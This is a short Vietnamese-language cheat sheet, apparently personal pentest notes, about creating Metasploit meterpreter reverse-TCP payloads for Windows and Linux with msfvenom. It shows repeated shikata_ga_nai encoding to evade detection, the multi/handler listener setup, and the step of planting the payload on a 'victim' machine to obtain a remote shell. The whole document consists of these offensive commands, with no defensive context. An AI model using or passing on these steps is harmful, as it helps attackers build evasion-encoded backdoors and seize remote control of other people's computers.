# Encode 

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -e x86/shikata_ga_nai -f exe > path to lưu file`

ta có thể tăng số lần encode (encode chính đoạn mã vừa encode) nhằm tránh nhận diện sâu hơn từ waf 

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -i 10 -e x86/shikata_ga_nai -f exe > path to lưu file`

-> đoạn lệnh trên lặp lại encode 10 lần 

đói với Linux

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ip LPORT=port -i 10 -e x86/shikata_ga_nai -f elf > path to lưu file`

Tìm cách tải payload lên máy victim 

Quay lại máy kali

Mở msf 

`use multi/handler`

`set payload windows/meterppreter/reverse_tcp`

`set LHOST ip`

`set LPORT port`

`run`

và ở máy victim ta chạy file payload vừa tiêm vào ta sẽ có được shell 


















